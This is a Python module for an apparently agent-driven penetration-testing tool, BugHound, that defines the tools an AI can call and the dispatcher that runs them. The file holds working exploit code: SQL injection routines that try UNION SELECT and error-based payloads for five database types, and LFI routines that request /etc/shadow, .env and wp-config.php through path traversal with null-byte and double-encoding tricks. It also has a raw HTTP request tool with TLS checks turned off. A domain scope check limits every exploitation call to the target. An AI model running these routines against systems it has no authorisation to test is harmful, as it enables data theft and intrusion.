"""Tool definitions and executor for BugHound agent mode.

Defines the tool schemas (OpenAI function-calling format) that the AI can
invoke, and the execute_tool() dispatcher that routes calls to actual
BugHound stage functions or exploitation helpers.
"""

from __future__ import annotations

import json
import asyncio
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import aiohttp
import structlog

logger = structlog.get_logger()

# ---------------------------------------------------------------------------
# HTTP constants (same as injection_tester.py)
# ---------------------------------------------------------------------------

_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
_HTTP_TIMEOUT = aiohttp.ClientTimeout(total=20)

# Maximum result size returned to the AI (avoid token overflow)
_MAX_RESULT_LEN = 8000

# ---------------------------------------------------------------------------
# Tool schemas (OpenAI function-calling format)
# ---------------------------------------------------------------------------

AGENT_TOOLS: list[dict[str, Any]] = [
    # === RECON / ANALYSIS ===
    {
        "type": "function",
        "function": {
            "name": "get_attack_surface",
            "description": (
                "Get Stage 3 attack surface analysis. Returns parameter "
                "classification, attack chains, immediate wins, and reasoning "
                "prompts for the target."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                },
                "required": ["workspace_id"],
            },
        },
    },

    # === TARGETED TESTING ===
    {
        "type": "function",
        "function": {
            "name": "run_technique",
            "description": (
                "Run a specific testing technique. Use this for targeted "
                "testing based on your analysis of the attack surface."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                    "technique_id": {
                        "type": "string",
                        "enum": [
                            "sqli_error_test", "sqli_param_fuzz",
                            "cookie_sqli", "post_sqli",
                            "reflected_xss_test", "xss_param_fuzz",
                            "stored_xss", "dom_xss", "cookie_xss",
                            "lfi_test", "rce_test", "post_rce",
                            "ssrf_test", "ssti_test", "post_ssti",
                            "csti_test", "xxe_test",
                            "crlf_test", "idor_test", "path_idor_test",
                            "open_redirect_test",
                            "header_injection_test",
                            "prototype_pollution_test",
                            "security_headers_check",
                            "transport_security_check",
                            "version_disclosure_check",
                            "pii_html_leakage",
                            "vulnerable_components_check",
                            "sensitive_leakage_test",
                            "viewstate_mac_check",
                            "default_credentials_test",
                            "cookie_deserialization",
                            "graphql_test", "jwt_test",
                            "wordpress_test", "spring_actuator_test",
                            "broken_access_control",
                            "rate_limit_test", "mass_assignment_test",
                            "cors_misconfig",
                        ],
                    },
                },
                "required": ["workspace_id", "technique_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "run_full_test",
            "description": (
                "Run ALL techniques (full Stage 4). Use when you want "
                "comprehensive testing instead of targeted techniques."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                    "test_classes": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": (
                            "Which vulnerability classes to test. "
                            "Omit for all classes."
                        ),
                    },
                },
                "required": ["workspace_id"],
            },
        },
    },

    # === EXPLOITATION (agent-only) ===
    {
        "type": "function",
        "function": {
            "name": "http_request",
            "description": (
                "Send a custom HTTP request. Use for manual exploitation, "
                "chaining findings, verifying bypasses, or extracting data "
                "from confirmed vulnerabilities."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "method": {
                        "type": "string",
                        "enum": [
                            "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS",
                        ],
                    },
                    "url": {"type": "string"},
                    "headers": {
                        "type": "object",
                        "description": "Custom headers to include.",
                    },
                    "body": {
                        "type": "string",
                        "description": "Request body (form-encoded or JSON string).",
                    },
                    "body_type": {
                        "type": "string",
                        "enum": ["form", "json", "xml", "raw"],
                        "description": "Body content type. Default: form.",
                    },
                },
                "required": ["method", "url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "extract_sqli_data",
            "description": (
                "Given a confirmed SQLi endpoint, attempt to extract data "
                "using UNION SELECT. Tries column counts 1-10."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "param": {"type": "string"},
                    "db_type": {
                        "type": "string",
                        "enum": [
                            "mysql", "postgresql", "mssql", "oracle", "sqlite",
                        ],
                    },
                    "query": {
                        "type": "string",
                        "description": (
                            "SQL query to extract, e.g. 'SELECT version()' "
                            "or 'SELECT table_name FROM information_schema.tables'"
                        ),
                    },
                },
                "required": ["url", "param", "db_type", "query"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "read_file_via_lfi",
            "description": (
                "Given a confirmed LFI endpoint, read a specific file from "
                "the server using path traversal."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "param": {"type": "string"},
                    "file_path": {
                        "type": "string",
                        "description": (
                            "File to read, e.g. /etc/passwd, /web.config, .env"
                        ),
                    },
                },
                "required": ["url", "param", "file_path"],
            },
        },
    },

    # === ANALYSIS / REVIEW ===
    {
        "type": "function",
        "function": {
            "name": "get_findings",
            "description": (
                "Get all current findings. Use to review what has been found "
                "and decide next steps."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                },
                "required": ["workspace_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "validate_findings",
            "description": (
                "Run Stage 5 validation on all findings using sqlmap/dalfox/curl "
                "to confirm or reject each finding."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                },
                "required": ["workspace_id"],
            },
        },
    },

    # === REPORT ===
    {
        "type": "function",
        "function": {
            "name": "generate_report",
            "description": (
                "Generate final security reports (HTML, markdown, executive summary)."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                },
                "required": ["workspace_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "add_finding",
            "description": (
                "Manually add a finding discovered through exploitation tools. "
                "Use when http_request reveals a vuln that automated techniques "
                "did not catch."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                    "vulnerability_class": {"type": "string"},
                    "severity": {
                        "type": "string",
                        "enum": ["critical", "high", "medium", "low", "info"],
                    },
                    "endpoint": {"type": "string"},
                    "description": {"type": "string"},
                    "evidence": {"type": "string"},
                    "curl_command": {"type": "string"},
                    "impact": {"type": "string"},
                },
                "required": [
                    "workspace_id", "vulnerability_class", "severity",
                    "endpoint", "description", "evidence",
                ],
            },
        },
    },
]

# ---------------------------------------------------------------------------
# Scope validation
# ---------------------------------------------------------------------------


def _is_in_scope(url: str, target_scope: str) -> bool:
    """Check if a URL is within the target's domain scope."""
    target_host = urlparse(target_scope).hostname or target_scope
    url_host = urlparse(url).hostname or ""
    return url_host == target_host or url_host.endswith(f".{target_host}")


# ---------------------------------------------------------------------------
# HTTP helpers for exploitation tools
# ---------------------------------------------------------------------------


def _get_auth_headers() -> dict[str, str]:
    """Retrieve auth headers from injection_tester if set."""
    try:
        from bughound.tools.testing.injection_tester import _AUTH_HEADERS
        return dict(_AUTH_HEADERS)
    except Exception:
        return {}


def _replace_param(url: str, param: str, new_value: str) -> str:
    """Replace a query parameter value in a URL."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        sep = "&" if parsed.query else ""
        new_query = f"{parsed.query}{sep}{urlencode({param: new_value})}"
    else:
        qs[param] = [new_value]
        new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _truncate(text: str, max_len: int = _MAX_RESULT_LEN) -> str:
    """Truncate text to max_len chars with indicator."""
    if len(text) <= max_len:
        return text
    return text[:max_len] + f"\n... [truncated, {len(text)} total chars]"


# ---------------------------------------------------------------------------
# Tool implementations
# ---------------------------------------------------------------------------


async def _tool_get_attack_surface(workspace_id: str) -> dict[str, Any]:
    """Get Stage 3 attack surface analysis."""
    from bughound.stages import analyze as stage_analyze
    return await stage_analyze.get_attack_surface(workspace_id)


async def _tool_run_technique(
    workspace_id: str, technique_id: str,
) -> dict[str, Any]:
    """Run a single testing technique."""
    from bughound.stages import techniques
    from bughound.core import workspace

    meta = await workspace.get_workspace(workspace_id)
    if meta is None:
        return {"status": "error", "message": f"Workspace '{workspace_id}' not found."}

    # Build targets list from workspace metadata
    target_host = meta.target
    if "://" in target_host:
        target_host = urlparse(target_host).hostname or target_host

    targets = [{"host": target_host, "priority": 1, "test_classes": []}]

    try:
        findings = await asyncio.wait_for(
            techniques.execute_technique(technique_id, workspace_id, targets),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return {
            "status": "error",
            "message": f"Technique '{technique_id}' timed out after 5 minutes.",
        }
    except Exception as exc:
        return {
            "status": "error",
            "message": f"Technique '{technique_id}' failed: {exc}",
        }

    # Assign finding IDs and persist
    import hashlib
    for f in findings:
        if not f.get("finding_id"):
            sev = f.get("severity", "info").lower()
            h_input = (
                f"{f.get('tool', '')}:{f.get('host', '')}:"
                f"{f.get('endpoint', '')}:{f.get('description', '')}"
            )
            h8 = hashlib.sha256(h_input.encode()).hexdigest()[:8]
            f["finding_id"] = f"finding_{sev}_{h8}"
        f.setdefault("validated", False)
        f.setdefault("validation_status", None)

    if findings:
        await _append_findings(workspace_id, findings)

    return {
        "status": "success",
        "technique": technique_id,
        "findings_count": len(findings),
        "findings": findings[:20],
    }


async def _tool_run_full_test(
    workspace_id: str,
    test_classes: list[str] | None = None,
) -> dict[str, Any]:
    """Run full Stage 4 testing."""
    from bughound.stages import analyze as stage_analyze
    from bughound.stages import test as stage_test
    from bughound.core import workspace

    meta = await workspace.get_workspace(workspace_id)
    if meta is None:
        return {"status": "error", "message": f"Workspace '{workspace_id}' not found."}

    target_host = meta.target
    if "://" in target_host:
        target_host = urlparse(target_host).hostname or target_host

    suggested = test_classes or [
        "sqli", "xss", "ssrf", "lfi", "ssti", "open_redirect",
        "crlf", "idor", "rce", "xxe", "header_injection",
        "graphql", "jwt", "misconfig", "default_creds",
        "cors", "bac", "csti", "cve_specific",
    ]

    scan_plan = {
        "targets": [
            {"host": target_host, "priority": 1, "test_classes": suggested},
        ],
        "global_settings": {
            "nuclei_severity": "critical,high,medium,low,info",
            "nuclei_rate_limit": 100,
            "nuclei_concurrency": 25,
        },
    }

    await stage_analyze.submit_scan_plan(workspace_id, scan_plan)

    # Run synchronously (no job manager -- agent can wait)
    result = await stage_test.execute_tests(workspace_id, job_manager=None)

    # Return a concise summary
    return {
        "status": result.get("status", "unknown"),
        "targets_tested": result.get("targets_tested", 0),
        "findings_total": result.get("findings_total", 0),
        "findings_by_severity": result.get("findings_by_severity", {}),
        "findings_by_class": result.get("findings_by_class", {}),
        "findings_needing_validation": result.get("findings_needing_validation", 0),
        "warnings": result.get("warnings", [])[:10],
        "findings": result.get("findings", [])[:20],
    }


async def _tool_http_request(
    method: str,
    url: str,
    headers: dict[str, str] | None = None,
    body: str | None = None,
    body_type: str = "form",
) -> dict[str, Any]:
    """Send a custom HTTP request for exploitation."""
    req_headers: dict[str, str] = {
        "User-Agent": _USER_AGENT,
        **_get_auth_headers(),
    }
    if headers:
        req_headers.update(headers)

    # Set content-type based on body_type
    kwargs: dict[str, Any] = {}
    if body:
        if body_type == "json":
            req_headers["Content-Type"] = "application/json"
            kwargs["data"] = body
        elif body_type == "xml":
            req_headers["Content-Type"] = "application/xml"
            kwargs["data"] = body
        elif body_type == "form":
            req_headers["Content-Type"] = "application/x-www-form-urlencoded"
            kwargs["data"] = body
        else:
            kwargs["data"] = body

    try:
        async with aiohttp.ClientSession() as session:
            async with session.request(
                method, url,
                headers=req_headers,
                ssl=False,
                timeout=_HTTP_TIMEOUT,
                allow_redirects=False,
                **kwargs,
            ) as resp:
                resp_body = await resp.text(errors="replace")

                # Collect response headers (first 10)
                resp_headers = dict(list(resp.headers.items())[:10])

                return {
                    "status_code": resp.status,
                    "headers": resp_headers,
                    "body": resp_body[:3000],
                    "body_length": len(resp_body),
                    "redirect_url": str(resp.headers.get("Location", "")),
                }
    except aiohttp.ClientError as exc:
        return {"status": "error", "message": f"Request failed: {exc}"}
    except asyncio.TimeoutError:
        return {"status": "error", "message": "Request timed out"}


async def _tool_extract_sqli_data(
    url: str,
    param: str,
    db_type: str,
    query: str,
) -> dict[str, Any]:
    """Attempt UNION SELECT data extraction from a confirmed SQLi endpoint."""
    # Comment syntax per DB
    comment = {
        "mysql": "-- -",
        "postgresql": "--",
        "mssql": "--",
        "oracle": "--",
        "sqlite": "--",
    }.get(db_type, "--")

    req_headers = {
        "User-Agent": _USER_AGENT,
        **_get_auth_headers(),
    }

    results: list[dict[str, Any]] = []

    try:
        async with aiohttp.ClientSession() as session:
            # Get baseline response for comparison
            async with session.get(
                url, headers=req_headers, ssl=False, timeout=_HTTP_TIMEOUT,
            ) as baseline_resp:
                baseline_body = await baseline_resp.text(errors="replace")
                baseline_len = len(baseline_body)

            # Try column counts 1 through 10
            for col_count in range(1, 11):
                for query_pos in range(col_count):
                    # Build NULL columns with query at query_pos
                    columns = []
                    for i in range(col_count):
                        if i == query_pos:
                            columns.append(f"({query})")
                        else:
                            columns.append("NULL")

                    union_payload = (
                        f"' UNION SELECT {','.join(columns)}{comment}"
                    )
                    test_url = _replace_param(url, param, union_payload)

                    try:
                        async with session.get(
                            test_url, headers=req_headers,
                            ssl=False, timeout=_HTTP_TIMEOUT,
                        ) as resp:
                            body = await resp.text(errors="replace")

                            # Check if response differs significantly from
                            # baseline (indicating successful injection)
                            if (
                                resp.status == 200
                                and len(body) != baseline_len
                                and len(body) > 100
                            ):
                                # Look for data that was not in baseline
                                new_content = []
                                for line in body.split("\n"):
                                    stripped = line.strip()
                                    if (
                                        stripped
                                        and stripped not in baseline_body
                                        and len(stripped) > 3
                                    ):
                                        new_content.append(stripped)

                                if new_content:
                                    return {
                                        "status": "success",
                                        "columns": col_count,
                                        "query_position": query_pos,
                                        "payload": union_payload,
                                        "extracted_data": "\n".join(
                                            new_content[:50]
                                        ),
                                        "curl_command": (
                                            f"curl -sk '{test_url}'"
                                        ),
                                    }
                    except Exception:
                        continue

            # Try error-based extraction as fallback
            error_payloads = {
                "mysql": f"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(({query}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a){comment}",
                "postgresql": f"' AND 1=CAST(({query}) AS INT){comment}",
                "mssql": f"' AND 1=CONVERT(INT,({query})){comment}",
                "oracle": f"' AND 1=UTL_INADDR.GET_HOST_ADDRESS(({query})){comment}",
                "sqlite": f"' AND 1=CAST(({query}) AS INT){comment}",
            }
            error_payload = error_payloads.get(db_type, error_payloads["mysql"])
            test_url = _replace_param(url, param, error_payload)

            try:
                async with session.get(
                    test_url, headers=req_headers,
                    ssl=False, timeout=_HTTP_TIMEOUT,
                ) as resp:
                    body = await resp.text(errors="replace")
                    # Look for error message containing extracted data
                    if resp.status in (200, 500) and body:
                        return {
                            "status": "partial",
                            "method": "error_based",
                            "payload": error_payload,
                            "response_snippet": body[:2000],
                            "curl_command": f"curl -sk '{test_url}'",
                        }
            except Exception:
                pass

    except Exception as exc:
        return {"status": "error", "message": f"Extraction failed: {exc}"}

    return {
        "status": "failed",
        "message": (
            "Could not extract data via UNION SELECT or error-based methods. "
            "Try manual exploitation with http_request()."
        ),
        "columns_tried": 10,
    }


async def _tool_read_file_via_lfi(
    url: str,
    param: str,
    file_path: str,
) -> dict[str, Any]:
    """Attempt to read a file via LFI using path traversal."""
    req_headers = {
        "User-Agent": _USER_AGENT,
        **_get_auth_headers(),
    }

    # File content indicators
    indicators = {
        "/etc/passwd": ["root:", "/bin/bash", "/bin/sh", "nobody:", "daemon:"],
        "/etc/shadow": ["root:", "$6$", "$5$", "$y$"],
        "/etc/hosts": ["localhost", "127.0.0.1"],
        "/web.config": ["<configuration", "<system.web", "<appSettings"],
        "web.config": ["<configuration", "<system.web", "<appSettings"],
        ".env": ["DB_", "APP_", "SECRET", "KEY=", "PASSWORD"],
        "wp-config.php": ["DB_NAME", "DB_USER", "DB_PASSWORD", "table_prefix"],
        "/windows/win.ini": ["[fonts]", "[extensions]"],
        "boot.ini": ["[boot loader]", "[operating systems]"],
    }

    # Get indicators for this file, or generic ones
    file_indicators = indicators.get(file_path, [])
    if not file_indicators:
        # Try matching partial path
        for known_file, inds in indicators.items():
            if known_file in file_path:
                file_indicators = inds
                break

    # Traversal depths to try
    traversals = [
        f"{'../' * depth}{file_path.lstrip('/')}"
        for depth in range(3, 9)
    ]
    # Also try with null byte and double-encoding
    traversals.extend([
        f"{'../' * 6}{file_path.lstrip('/')}%00",
        f"{'..%2f' * 6}{file_path.lstrip('/')}",
        f"{'..%252f' * 6}{file_path.lstrip('/')}",
        f"{'..../' * 6}{file_path.lstrip('/')}",
    ])

    try:
        async with aiohttp.ClientSession() as session:
            for traversal in traversals:
                test_url = _replace_param(url, param, traversal)

                try:
                    async with session.get(
                        test_url, headers=req_headers,
                        ssl=False, timeout=_HTTP_TIMEOUT,
                    ) as resp:
                        body = await resp.text(errors="replace")

                        if resp.status == 200 and body:
                            # Check for file content indicators
                            found = False
                            if file_indicators:
                                found = any(
                                    ind in body for ind in file_indicators
                                )
                            else:
                                # If no specific indicators, check that
                                # response differs from error page
                                found = len(body) > 100 and resp.status == 200

                            if found:
                                return {
                                    "status": "success",
                                    "file_path": file_path,
                                    "traversal": traversal,
                                    "content": body[:3000],
                                    "content_length": len(body),
                                    "curl_command": f"curl -sk '{test_url}'",
                                }
                except Exception:
                    continue

    except Exception as exc:
        return {"status": "error", "message": f"LFI read failed: {exc}"}

    return {
        "status": "failed",
        "message": (
            f"Could not read {file_path} via LFI. "
            "Try different param or manual http_request()."
        ),
        "traversals_tried": len(traversals),
    }


async def _tool_get_findings(workspace_id: str) -> dict[str, Any]:
    """Read current findings from workspace."""
    from bughound.core import workspace

    raw = await workspace.read_data(
        workspace_id, "vulnerabilities/scan_results.json",
    )
    if raw is None:
        return {"status": "success", "findings_count": 0, "findings": []}

    items = raw.get("data", raw) if isinstance(raw, dict) else raw
    findings = items if isinstance(items, list) else []

    # Count by severity and class
    from collections import Counter
    sev_counts: Counter[str] = Counter()
    class_counts: Counter[str] = Counter()
    for f in findings:
        if isinstance(f, dict):
            sev_counts[f.get("severity", "info")] += 1
            class_counts[f.get("vulnerability_class", "other")] += 1

    return {
        "status": "success",
        "findings_count": len(findings),
        "by_severity": dict(sev_counts.most_common()),
        "by_class": dict(class_counts.most_common()),
        "findings": findings[:30],
    }


async def _tool_validate_findings(workspace_id: str) -> dict[str, Any]:
    """Run Stage 5 validation on all findings."""
    from bughound.stages import validate as stage_validate
    return await stage_validate.validate_all(workspace_id)


async def _tool_generate_report(workspace_id: str) -> dict[str, Any]:
    """Run Stage 6 report generation."""
    from bughound.stages import report as stage_report
    return await stage_report.generate_report(workspace_id, "all")


async def _tool_add_finding(
    workspace_id: str,
    vulnerability_class: str,
    severity: str,
    endpoint: str,
    description: str,
    evidence: str,
    curl_command: str = "",
    impact: str = "",
) -> dict[str, Any]:
    """Manually add a finding to scan_results.json."""
    import hashlib
    from bughound.core import workspace

    h_input = f"agent:{endpoint}:{vulnerability_class}:{description}"
    h8 = hashlib.sha256(h_input.encode()).hexdigest()[:8]
    finding_id = f"finding_{severity}_{h8}"

    host = ""
    try:
        host = (urlparse(endpoint).hostname or "").lower()
    except Exception:
        pass

    finding = {
        "finding_id": finding_id,
        "host": host,
        "endpoint": endpoint,
        "vulnerability_class": vulnerability_class,
        "severity": severity,
        "tool": "agent_manual",
        "technique_id": "agent_exploitation",
        "description": description,
        "evidence": evidence,
        "curl_command": curl_command,
        "impact": impact,
        "confidence": "high",
        "needs_validation": False,
        "validated": True,
        "validation_status": "confirmed",
    }

    await _append_findings(workspace_id, [finding])

    return {
        "status": "success",
        "finding_id": finding_id,
        "message": f"Finding added: {vulnerability_class} ({severity}) at {endpoint}",
    }


# ---------------------------------------------------------------------------
# Shared helper: append findings to scan_results.json
# ---------------------------------------------------------------------------


async def _append_findings(
    workspace_id: str,
    new_findings: list[dict[str, Any]],
) -> None:
    """Append findings to existing scan_results.json."""
    from bughound.core import workspace

    existing = await workspace.read_data(
        workspace_id, "vulnerabilities/scan_results.json",
    )

    if isinstance(existing, dict) and "data" in existing:
        existing_items = existing["data"]
    elif isinstance(existing, list):
        existing_items = existing
    else:
        existing_items = []

    existing_ids = {
        f.get("finding_id")
        for f in existing_items
        if isinstance(f, dict)
    }
    merged = list(existing_items)
    for f in new_findings:
        if f.get("finding_id") not in existing_ids:
            merged.append(f)

    await workspace.write_data(
        workspace_id, "vulnerabilities/scan_results.json", merged,
        generated_by="agent", target="multiple",
    )


# ---------------------------------------------------------------------------
# Main dispatcher
# ---------------------------------------------------------------------------


async def execute_tool(
    name: str,
    arguments: dict[str, Any],
    workspace_id: str,
    target_scope: str,
) -> str:
    """Execute a tool call and return the result as a JSON string.

    Parameters
    ----------
    name : str
        Tool function name from AGENT_TOOLS.
    arguments : dict
        Arguments from the AI's tool call.
    workspace_id : str
        Active workspace ID (injected if not in arguments).
    target_scope : str
        Target domain/URL for scope validation.

    Returns
    -------
    str
        JSON string result, truncated to _MAX_RESULT_LEN.
    """
    # Inject workspace_id if the tool expects it but AI didn't provide it
    if "workspace_id" in arguments:
        ws_id = arguments["workspace_id"]
    else:
        ws_id = workspace_id

    try:
        if name == "get_attack_surface":
            result = await _tool_get_attack_surface(ws_id)

        elif name == "run_technique":
            result = await _tool_run_technique(
                ws_id, arguments["technique_id"],
            )

        elif name == "run_full_test":
            result = await _tool_run_full_test(
                ws_id, arguments.get("test_classes"),
            )

        elif name == "http_request":
            # Scope validation for HTTP requests
            url = arguments.get("url", "")
            if not _is_in_scope(url, target_scope):
                result = {
                    "status": "error",
                    "message": (
                        f"URL '{url}' is out of scope. "
                        f"Target scope: {target_scope}"
                    ),
                }
            else:
                result = await _tool_http_request(
                    method=arguments["method"],
                    url=url,
                    headers=arguments.get("headers"),
                    body=arguments.get("body"),
                    body_type=arguments.get("body_type", "form"),
                )

        elif name == "extract_sqli_data":
            url = arguments.get("url", "")
            if not _is_in_scope(url, target_scope):
                result = {
                    "status": "error",
                    "message": f"URL '{url}' is out of scope.",
                }
            else:
                result = await _tool_extract_sqli_data(
                    url=url,
                    param=arguments["param"],
                    db_type=arguments["db_type"],
                    query=arguments["query"],
                )

        elif name == "read_file_via_lfi":
            url = arguments.get("url", "")
            if not _is_in_scope(url, target_scope):
                result = {
                    "status": "error",
                    "message": f"URL '{url}' is out of scope.",
                }
            else:
                result = await _tool_read_file_via_lfi(
                    url=url,
                    param=arguments["param"],
                    file_path=arguments["file_path"],
                )

        elif name == "get_findings":
            result = await _tool_get_findings(ws_id)

        elif name == "validate_findings":
            result = await _tool_validate_findings(ws_id)

        elif name == "generate_report":
            result = await _tool_generate_report(ws_id)

        elif name == "add_finding":
            result = await _tool_add_finding(
                workspace_id=ws_id,
                vulnerability_class=arguments["vulnerability_class"],
                severity=arguments["severity"],
                endpoint=arguments["endpoint"],
                description=arguments["description"],
                evidence=arguments["evidence"],
                curl_command=arguments.get("curl_command", ""),
                impact=arguments.get("impact", ""),
            )

        else:
            result = {
                "status": "error",
                "message": f"Unknown tool: {name}",
            }

    except Exception as exc:
        logger.error("agent_tool.error", tool=name, error=str(exc))
        result = {
            "status": "error",
            "message": f"Tool '{name}' failed: {exc}",
        }

    return _truncate(json.dumps(result, default=str))
